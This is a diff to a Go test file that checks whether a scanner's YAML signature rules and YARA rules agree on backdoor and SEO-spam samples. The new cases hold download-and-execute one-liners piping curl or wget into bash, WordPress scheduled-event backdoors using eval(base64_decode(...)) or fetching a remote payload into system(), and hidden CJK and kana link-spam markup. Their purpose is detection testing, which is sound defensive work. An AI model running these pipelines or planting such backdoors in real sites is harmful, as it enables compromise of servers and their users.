@@ -31,6 +31,7 @@ func TestRepositoryBackdoorRulesMatchScannerParity(t *testing.T) {
 	tests := []struct {
 		name   string
 		rule   string
+		ext    string
 		want   bool
 		sample string
 	}{
@@ -347,6 +348,18 @@ $out = shell_exec($cmd);`,
 			sample: "wget http://payload.example.test/p | tee /tmp/p | bash\n",
 		},
 		{
+			name:   "mixed-case download piped through an intermediate command",
+			rule:   "dropper_wget_exec",
+			want:   true,
+			sample: "CuRl http://payload.example.test/p | tee /tmp/p | BaSh\n",
+		},
+		{
+			name:   "download executed before a trailing pipeline stage",
+			rule:   "dropper_wget_exec",
+			want:   true,
+			sample: "curl http://payload.example.test/p | bash | cat\n",
+		},
+		{
 			name:   "commented-out download pipeline",
 			rule:   "dropper_wget_exec",
 			sample: "# curl http://payload.example.test/p.sh | bash\n",
@@ -358,6 +371,29 @@ $out = shell_exec($cmd);`,
 			sample: "<?php wp_schedule_event(time(),'hourly','x'); eval(base64_decode($p));\n",
 		},
 		{
+			name:   "mixed-case scheduled event at the bounded gap limit",
+			rule:   "wp_cron_backdoor",
+			want:   true,
+			sample: "<?php WP_SCHEDULE_EVENT($time,'hourly','x')" + strings.Repeat(" ", 800) + "EvAl(BASE64_DECODE($p));\n",
+		},
+		{
+			name:   "scheduled event beyond the bounded gap limit",
+			rule:   "wp_cron_backdoor",
+			sample: "<?php wp_schedule_event($time,'hourly','x')" + strings.Repeat(" ", 801) + "eval(base64_decode($p));\n",
+		},
+		{
+			name:   "scheduled payload before a later non-matching eval",
+			rule:   "wp_cron_backdoor",
+			want:   true,
+			sample: "<?php wp_schedule_event($time,'hourly','x'); eval(base64_decode($p)); eval($local);\n",
+		},
+		{
+			name:   "mixed-case scheduled event fetching a remote payload",
+			rule:   "wp_cron_backdoor",
+			want:   true,
+			sample: "<?PHP WP_SCHEDULE_EVENT($time,'hourly','x'); $p = FILE_GET_CONTENTS('HTTPS://payload.example.test/p'); SyStEm($p);\n",
+		},
+		{
 			name:   "scheduled event calling a local maintenance function",
 			rule:   "wp_cron_backdoor",
 			sample: "<?php wp_schedule_event(time(),'hourly','my_task');\nfunction my_task(){ update_option('x',1); }\n",
@@ -366,30 +402,168 @@ $out = shell_exec($cmd);`,
 			// The rule needs >= 10 CJK codepoints next to a link, hidden by CSS.
 			name:   "hidden block of CJK keywords wrapping a link",
 			rule:   "spam_chinese_seo",
+			ext:    ".html",
 			want:   true,
 			sample: `<div style="display:none">` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://spam.example.test/x">x</a></div>`,
 		},
 		{
+			name:   "hidden block of CJK keywords with mixed-case link markup",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<DIV STYLE="DISPLAY:NONE">` + strings.Repeat("\u4e2d", 10) + ` <A HREF="HTTPS://spam.example.test/x">x</A></DIV>`,
+		},
+		{
+			name:   "XHTML document with hidden CJK link spam",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<?xml version="1.0"?><html><div style="display:none">` + strings.Repeat("\u4e2d", 10) + `<a href="https://spam.example.test">x</a></div></html>`,
+		},
+		{
 			name:   "visible CJK content linking out",
 			rule:   "spam_chinese_seo",
+			ext:    ".html",
 			sample: `<div>` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://ok.example.test/x">x</a></div>`,
+		},
+		{
+			name:   "CJK lower boundary",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<div style="display:none">` + strings.Repeat("\u4e00", 10) + `<a href="https://spam.example.test">x</a></div>`,
+		},
+		{
+			name:   "CJK upper boundary",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<div style="display:none">` + strings.Repeat("\u9fff", 10) + `<a href="https://spam.example.test">x</a></div>`,
+		},
+		{
+			name:   "CJK UTF-8 plane transitions",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<div style="display:none">` + strings.Repeat("\u4fff\u5000\u8fff\u9000", 3) + `<a href="https://spam.example.test">x</a></div>`,
+		},
+		{
+			name:   "codepoint before CJK range",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			sample: `<div style="display:none">` + strings.Repeat("\u4dff", 10) + `<a href="https://spam.example.test">x</a></div>`,
+		},
+		{
+			name:   "codepoint after CJK range",
+			rule:   "spam_chinese_seo",
+			ext:    ".html",
+			sample: `<div style="display:none">` + strings.Repeat("\ua000", 10) + `<a href="https://spam.example.test">x</a></div>`,
+		},
+		{
+			name:   "JavaScript catalogue containing hidden CJK link text",
+			rule:   "spam_chinese_seo",
+			ext:    ".js",
+			sample: `const css='display:none'; const help='` + strings.Repeat("\u4e2d", 10) + ` href="https://docs.example.test"';`,
+		},
+		{
+			name:   "translation catalogue containing hidden CJK link text",
+			rule:   "spam_chinese_seo",
+			ext:    ".po",
+			sample: `msgid "display:none ` + strings.Repeat("\u4e2d", 10) + ` href='https://docs.example.test'"`,
+		},
+		{
+			name:   "binary upload containing hidden CJK link text",
+			rule:   "spam_chinese_seo",
+			ext:    ".bin",
+			sample: "\x00\x01\xffdisplay:none " + strings.Repeat("\u4e2d", 10) + ` href="https://docs.example.test"`,
 		},
 		{
 			name:   "kana keyword stuffing beside pharma spam",
 			rule:   "spam_japanese_seo",
+			ext:    ".html",
 			want:   true,
 			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` viagra online</p>`,
 		},
 		{
+			name:   "kana keyword stuffing with mixed-case keyword",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<P>` + strings.Repeat("\u3042", 10) + ` ViAgRa online</P>`,
+		},
+		{
 			name:   "ordinary kana paragraph",
 			rule:   "spam_japanese_seo",
+			ext:    ".html",
 			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` normal content</p>`,
+		},
+		{
+			name:   "kana lower boundary",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<p>` + strings.Repeat("\u3040", 10) + ` casino</p>`,
+		},
+		{
+			name:   "kana upper boundary",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<p>` + strings.Repeat("\u30ff", 10) + ` casino</p>`,
+		},
+		{
+			name:   "kana UTF-8 byte transitions",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<p>` + strings.Repeat("\u307f\u3080\u30bf\u30c0", 3) + ` casino</p>`,
+		},
+		{
+			name:   "CJK boundaries in Japanese spam rule",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			want:   true,
+			sample: `<p>` + strings.Repeat("\u4e00\u9fff", 5) + ` casino</p>`,
+		},
+		{
+			name:   "codepoint before kana range",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			sample: `<p>` + strings.Repeat("\u303f", 10) + ` casino</p>`,
+		},
+		{
+			name:   "codepoint after kana range",
+			rule:   "spam_japanese_seo",
+			ext:    ".html",
+			sample: `<p>` + strings.Repeat("\u3100", 10) + ` casino</p>`,
+		},
+		{
+			name:   "translation catalogue containing Japanese casino text",
+			rule:   "spam_japanese_seo",
+			ext:    ".po",
+			sample: `msgid "` + strings.Repeat("\u3042", 10) + ` casino"`,
+		},
+		{
+			name:   "binary catalogue containing Japanese casino text",
+			rule:   "spam_japanese_seo",
+			ext:    ".mo",
+			sample: "\xde\x12\x04\x95\x00\x00" + strings.Repeat("\u3042", 10) + " casino",
+		},
+		{
+			name:   "JavaScript catalogue containing Japanese casino text",
+			rule:   "spam_japanese_seo",
+			ext:    ".js",
+			sample: `const translation='` + strings.Repeat("\u3042", 10) + ` casino';`,
 		},
 	}
 
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
-			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), ".php"), tc.rule)
+			ext := tc.ext
+			if ext == "" {
+				ext = ".php"
+			}
+			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), ext), tc.rule)
 			yaraHit := hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.rule)
 			if yamlHit != yaraHit {
 				t.Fatalf("%s outcome differs: YAML=%t YARA=%t", tc.rule, yamlHit, yaraHit)
